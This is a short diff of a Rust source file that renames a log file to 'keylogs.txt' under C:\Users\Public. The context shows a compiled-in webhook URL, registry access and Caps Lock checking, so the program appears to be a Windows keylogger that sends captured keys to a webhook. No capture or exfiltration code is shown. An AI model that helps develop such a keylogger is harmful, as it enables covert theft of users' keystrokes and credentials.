@@ -14,7 +14,7 @@ use winreg::RegKey;
 
 // The contents of the file are read at COMPILE TIME and put here as a string
 const WEBHOOK_URL: &str = include_str!("../config/webhook.url");
-const LOG_PATH: &str = "C:\\Users\\Public\\logrust.txt";
+const LOG_PATH: &str = "C:\\Users\\Public\\keylogs.txt";
 
 /// # Checks if the Caps Lock key is toggled on.
 ///
